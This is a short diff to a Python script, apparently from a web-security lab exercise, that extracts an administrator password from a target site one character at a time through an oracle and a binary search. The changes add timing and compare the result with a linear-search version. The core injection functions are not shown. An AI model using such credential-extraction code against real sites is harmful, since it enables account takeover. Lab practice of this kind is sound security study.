@@ -86,10 +86,12 @@ def binary_search(url):
     administrator_prefix = ''
     charset = string.ascii_lowercase + string.digits
     mid = len(charset) // 2
+    begin_time = time.perf_counter()
     while True:
         administrator_prefix = recursive_search(url, administrator_prefix, charset, mid)
         print(f"Admin password: {administrator_prefix}")
         if test_string(url, administrator_prefix, '$'):
+            print(f"Time elapsed is {time.perf_counter()-begin_time}")
             return administrator_prefix
 
 
@@ -103,11 +105,13 @@ if __name__ == "__main__":
 
     url = f'https://{site}/'
 
-    # print(linear_search())
+    control_password = linear_search()
     
     # Step #11: Binary Search:
     admin_password = binary_search(url)
-    print(f"Final password is: {admin_password}\n")
+    #print(f"Final password is: {admin_password}\n")
+
+    print(f"\nControl password: {control_password}\nMy Attempt: {admin_password}")
 
 
 
